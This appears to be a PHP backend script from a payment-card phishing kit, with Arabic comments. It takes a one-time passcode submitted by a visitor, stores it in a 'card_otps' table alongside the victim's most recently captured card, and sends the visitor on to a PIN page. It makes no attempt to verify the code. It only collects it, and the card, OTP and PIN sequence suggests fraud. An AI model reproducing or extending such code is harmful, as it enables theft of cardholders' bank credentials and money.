<?php
session_start();
require_once('../dashboard/init.php');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('METHOD_NOT_ALLOWED');
}

$userId = $_SESSION['current_user_id'] ?? null;

if (!$userId) {
    http_response_code(400);
    exit('NO_USER_ID');
}

$otpCode = $_POST['otp'] ?? '';

if (empty($otpCode)) {
    http_response_code(400);
    exit('NO_OTP');
}

// ✅ الحصول على آخر بطاقة للمستخدم
$lastCard = $User->fetchLastCardByUserId($userId);

if (!$lastCard) {
    http_response_code(400);
    exit('NO_CARD_FOUND');
}

$cardId = $lastCard->id;

// ✅ حفظ OTP في جدول card_otps
$saved = $User->insertCardOTP($cardId, $userId, $otpCode);

if ($saved) {
    // ✅ إعادة التوجيه إلى pin.php مع user ID
    header('Location: ../pin.php?id=' . $userId);
    exit;
} else {
    http_response_code(500);
    exit('SAVE_FAILED');
}